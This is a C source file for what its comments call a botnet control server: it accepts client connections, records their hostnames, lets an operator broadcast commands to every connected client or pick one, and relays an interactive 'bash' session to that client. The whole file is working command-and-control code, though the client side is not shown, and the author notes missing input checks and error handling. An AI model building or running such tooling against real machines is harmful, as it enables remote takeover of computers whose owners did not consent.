// Listens for connection and sends message to connected client
// to compile: gcc server.c -o server -lpthread

/*
Code is void of input sanitation and missing a lot of error checks.
Code does not update array when client disconnects.
Code has no functionality to exit cleanly.exir
*/

#include "simple_networking.h"
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/select.h>

// Function declarations
void print_connection(connection client_con, int new_fd);
void print_welcome_message();
void print_help_screen();
void print_command_help_screen();
void *handle_connection(void *my_connection);
void *bot_command(void *current);

// Global Graceful Exit Flag
int exitflag = 0;

static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

int main(void)
{
    // Set the client connection to be the head of the list
    connection client_con = bind_socket("127.0.0.1", 8881);
    client_con.next = NULL;

    print_welcome_message();

    // Add listener information to our head's array
    client_con.pfds = malloc(sizeof(struct pollfd));
    client_con.pfds[0].fd = client_con.sock_fd;
    client_con.pfds[0].events = POLLIN;

    pthread_t control_thread, connection_thread;

    // Create thread to control botnet
    pthread_create(&control_thread, NULL, bot_command, &client_con);
    pthread_create(&connection_thread, NULL, handle_connection, &client_con);

    // Wait for threads to finish
    pthread_join(control_thread, NULL);
    pthread_join(connection_thread, NULL);

    // Exit
    return 0;
}

// Handles incomming connections and appends information to array
// This writes data to the connection struct
void *handle_connection(void *arg)
{
    connection *head = (connection *)arg;
    socklen_t client_addr_size;
    int new_fd;
    int fd_count = 1;
    // implemented for testing purposes. REMOVE.
    int host_x = 0;

    printf("[+] Looking for connections\n");

    while (1)
    {

        connection *current = head;

        while (current != NULL)
        {
            // Poll the array for events and set .revents
            int rc = poll(head->pfds, fd_count, -1);

            // Check return code of poll(). Return error if -1
            if (rc == -1)
            {
                perror("[-] Error poll()");
                exit(1);
            }

            // Check if socket is ready to read
            if (head->pfds->revents & POLLIN)
            {
                // If listener is ready to read, handle new connection
                if (head->pfds->fd == head->sock_fd)
                {
                    // Accept queued connection and assign new file descriptor
                    client_addr_size = sizeof(head->client_addr);
                    new_fd = accept(head->sock_fd,
                                    (struct sockaddr *)&head->client_addr, &client_addr_size);

                    // Check return code of accept(). Return error if -1
                    if (new_fd == -1)
                    {
                        perror("[-] Error accept()");
                    }
                    else
                    {
                        // Set lock
                        pthread_mutex_lock(&mutex);

                        // Add new connection information to list
                        connection *new_con = create_connection(head, 0);
                        new_con->pfds->fd = new_fd;
                        new_con->pfds->events = POLLIN;

                        // Get hostname from client
                        send(new_con->pfds->fd, "hostname", 8, 0);
                        char recieved_data[8192];
                        int bytes_recv = recv(new_con->pfds->fd, recieved_data, 8192, 0);

                        if (bytes_recv == 0)
                        {
                            // Oops, our recv call failed.
                            printf("[-] Unable to recieve hostname from new client.\n");
                        }

                        // Overwrite the newline char with a null terminator
                        recieved_data[bytes_recv - 1] = '\0';

                        new_con->hostname = malloc(bytes_recv);
                        sprintf(new_con->hostname, "%s%d", recieved_data, host_x);
                        host_x++;
                        printf("New Connection from %s\n", new_con->hostname);

                        // Release lock
                        pthread_mutex_unlock(&mutex);
                    }
                }
            }
            current = current->next;
            fd_count = count_connections(head);
        }
    }
}

void *bot_command(void *arg)

{

    char data[1024];
    int rc = 0;

    connection *head = (connection *)arg;
    connection *tmp = (connection *)malloc(sizeof(connection));

    struct timeval timeout;
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;

    while (1)
    {

        // Prompt user for input and remove trailing newline
        // Indicate user is in 'console' control
        printf("[Console] >> ");
        fgets(data, sizeof(data), stdin);
        data[strcspn(data, "\n")] = 0;

        // print help screen for commands to use in 'console'
        if (strcmp(data, "help") == 0)
        {

            print_help_screen();
        }

        // Display current list of connections
        // John is working to store host names, rather than client 1, 2, 3, etc..
        else if (strcmp(data, "show") == 0)
        {
            // Set lock
            pthread_mutex_lock(&mutex);

            // Omit server info from description
            tmp = head;
            tmp = tmp->next;
            int i = 1;

            // Iterate through array and print client information
            while (tmp != NULL)
            {
                printf("Client %d - %s - is on fd %d\n", i, tmp->hostname, tmp->sock_fd);
                tmp = tmp->next;
                i++;
            }
            if (i == 1)
            {
                printf("[-] No connections!\n");
            }

            // Release lock
            pthread_mutex_unlock(&mutex);
        }

        // Enter 'command' control
        else if (strcmp(data, "command") == 0)
        {
            printf("\nEnter <help> to display list of available options under the command mode\n");
            printf("\nEnter <back> to exit command mode\n\n");
            while (1)
            {
                // Prompt user for input and remove trailing newline
                printf("[Command] >> ");
                fgets(data, sizeof(data), stdin);
                data[strcspn(data, "\n")] = 0;

                // Print list of commands to use in 'command' control
                if (strcmp(data, "help") == 0)
                {
                    print_command_help_screen();
                }

                // Display current list of connections
                // Currently unsure how to format this feature into a function...
                else if (strcmp(data, "show") == 0)
                {

                    // Set lock
                    pthread_mutex_lock(&mutex);

                    // Omit server info from description
                    tmp = head;
                    tmp = tmp->next;
                    int i = 1;

                    // Iterate through array and print client information
                    while (tmp != NULL)
                    {
                        printf("Client %d - %s - is on fd %d\n", i, tmp->hostname, tmp->sock_fd);
                        tmp = tmp->next;
                        i++;
                    }
                    if (i == 1)
                    {
                        printf("[-] No connections!\n");
                    }

                    // Release lock
                    pthread_mutex_unlock(&mutex);
                }

                // Send command to ALL connections except listener
                else if (strcmp(data, "all") == 0)
                {
                    // This allows consecutive command message to all clients
                    while (1)
                    {
                        // Prompt user for input and remove trailing newline
                        printf("[Command][All] Enter command: ");
                        fgets(data, sizeof(data), stdin);
                        data[strcspn(data, "\n")] = 0;

                        if (strcmp(data, "back") == 0)
                        {
                            break;
                        }

                        // Send data to client specified by user input, based on array index
                        tmp = head;
                        tmp = tmp->next;
                        while (tmp != NULL)
                        {
                            send(tmp->pfds->fd, data, sizeof(data), 0);
                            // TODO: Limit the length of the data string below
                            printf("[+] Sent %s to %s\n", data, tmp->hostname);

                            // Wait for a response
                            char recieved_data[8192];
                            int bytes_recv = recv(tmp->pfds->fd, recieved_data, 8192, 0);

                            if (bytes_recv == 0)
                            {
                                // Oops, our recv call failed.
                                printf("[-] Unable to recieve from %s. Removing from active connections...\n", tmp->hostname);
                                
                                // Delete connection from list
                                delete_connection(head, tmp);
                                tmp = tmp->next;
                                continue;
                            }

                            recieved_data[bytes_recv] = '\0';
                            printf("%s said: %s\n", tmp->hostname, recieved_data);

                            tmp = tmp->next;
                        }
                    }
                }

                // Send command to SINGLE client
                else if (strcmp(data, "single") == 0)
                {
                    // Prompt user for input, remove trailing newline and convert input to int
                    printf("[Command][Single] Enter client: ");
                    fgets(data, sizeof(data), stdin);
                    data[strcspn(data, "\n")] = 0;
                    int num = atoi(data);

                    // Sanitise user input
                    if (num < 1 || num > (count_connections(head) - 1))
                    {
                        printf("[-] No such connection %d\n", num);
                        printf("[-] The current number of connections is %d\n", (count_connections(head) - 1));
                        continue;
                    }

                    // Find the correct client in the list
                    int i = 0;
                    tmp = head;
                    while (i < num && tmp != NULL)
                    {
                        tmp = tmp->next;
                        i++;
                    }
                    printf("[+] Entering raw input mode with client %s\n", tmp->hostname);
                    printf("[+] To escape raw mode, type exit\n");
                    rc = send(tmp->pfds->fd, "bash", 5, 0);

                    printf("rc: %d\n", rc);

                    // This is where the ugly low-level stuff begins... Essentially the same code as the client side.
                    // Within the while loop, we shouldn't clutter the screen with lots of server generated messages
                    int safe_exit = 0;
                    char input[250];
                    fd_set raw_fds;
                    pthread_mutex_lock(&mutex);
                    while (safe_exit == 0)
                    {
                        // We'll need to start a direct line between stdin here and the client
                        FD_ZERO(&raw_fds);
                        FD_SET(tmp->pfds->fd, &raw_fds);
                        FD_SET(0, &raw_fds);

                        // Use select to find which fd is ready to go
                        int select_return = select(tmp->pfds->fd + 1, &raw_fds, NULL, NULL, &timeout);

                        if (select_return == 0){
                            printf("Timeout occured.\n");
                            safe_exit = 1;
                            break;
                        }

                        if (select_return == -1)
                        {
                            perror("[-] Unable to enter raw mode. select() returned: ");
                            safe_exit = 1;
                            break;
                        }
                        else
                        {
                            // See if we've got something to read on our connection
                            if (FD_ISSET(tmp->pfds->fd, &raw_fds))
                            {
                                // Reset input, no bugs were here yet but I thought it might be a good idea...
                                memset(input, '\0', 250);
                                // TODO make this variable length
                                select_return = read(tmp->pfds->fd, input, sizeof(input));
                                if (select_return > 0)
                                {
                                    // Send data on to stdout
                                    write(1, input, select_return);
                                }
                                else if (select_return < 0)
                                {
                                    perror("[-] Unable to read from client.");
                                    safe_exit = 1;
                                    break;
                                }
                            }

                            // See if we've got something on stdin
                            if (FD_ISSET(0, &raw_fds))
                            {
                                // Reset input - this fixes strstr later on...
                                memset(input, '\0', 250);
                                select_return = read(0, input, sizeof(input));
                                if (select_return > 0)
                                {
                                    // Match anything with exit in the string. This is ugly :/
                                    if (strstr(input, "exit") != NULL)
                                    {
                                        printf("[+] Exiting RAW mode\n");
                                        write(tmp->pfds->fd, "exit", 5);
                                        safe_exit = 1;
                                        break;
                                    }
                                    // Send data to client
                                    write(tmp->pfds->fd, input, select_return);
                                }
                                else if (select_return < 0)
                                {
                                    perror("[-] Unable to send to client.");
                                    safe_exit = 1;
                                    break;
                                }
                            }
                        }
                    }
                    pthread_mutex_unlock(&mutex);
                }
                // Exit command control
                else if (strcmp(data, "back") == 0)
                {
                    break;
                }
            }
        }

        // Exit control of bot
        else if (strcmp(data, "exit") == 0)
        {
            while (1)
            {
                printf("Are You Sure? yes/no\n");
                fgets(data, sizeof(data), stdin);
                data[strcspn(data, "\n")] = 0;

                if (strcmp(data, "yes") == 0)
                {
                    printf("\nExiting...  \n");
                    exit(0);
                }
                else if (strcmp(data, "no") == 0)
                {
                    break;
                }
            }
        }
    }
}

// Function to print welcome screen
void print_welcome_message()
{
    system("clear");

    printf("\n******************************************************************************\n");
    printf("dP   dP   dP  88888888b dP         a88888b.  .88888.  8888ba.88ba   88888888b \n");
    printf("88   88   88  88        88        d8'   `88 d8'   `8b 88  `8b  `8b  88        \n");
    printf("88  .8P  .8P  88aaaa    88        88        88     88 88   88   88  88aaaa    \n");
    printf("88  d8'  d8'  88        88        88        88     88 88   88   88  88        \n");
    printf("88.d8P8.d8P   88        88        Y8.   .88 Y8.   .8P 88   88   88  88        \n");
    printf("8888' Y88'    88888888P 88888888P  Y88888P'  `8888P'  dP   dP   dP  88888888P \n");
    printf("******************************************************************************\n\n");
    printf("This is the console page\n");
    printf("Please enter <help> to display a list of available commands\n");
    printf("Enter <exit> to terminate the program\n\n");

    return;
}

// Example help screen function
void print_help_screen()
{
    printf("\nCONSOLE PAGE\n\n");
    printf("Options            DESCRIPTIONS\n");
    printf("=====================================================\n");
    printf("show             : Display list of connected clients\n");
    printf("help             : List of commands from console    \n");
    printf("exit             : Terminate the program            \n");
    printf("command          : Enter command control mode       \n");
    printf("=====================================================\n\n");
    return;
}

void print_command_help_screen()
{
    printf("\nCOMMAND PAGE\n\n");
    printf("OPTIONS            DESCRIPTIONS\n");
    printf("=====================================================\n");
    printf("show             : Display list of connections       \n");
    printf("help             : List of commands from console     \n");
    printf("all              : Send command to all connections   \n");
    printf("single           : Send command to a connected client\n");
    printf("back             : back to the previous page         \n");
    printf("=====================================================\n\n");
    return;
}
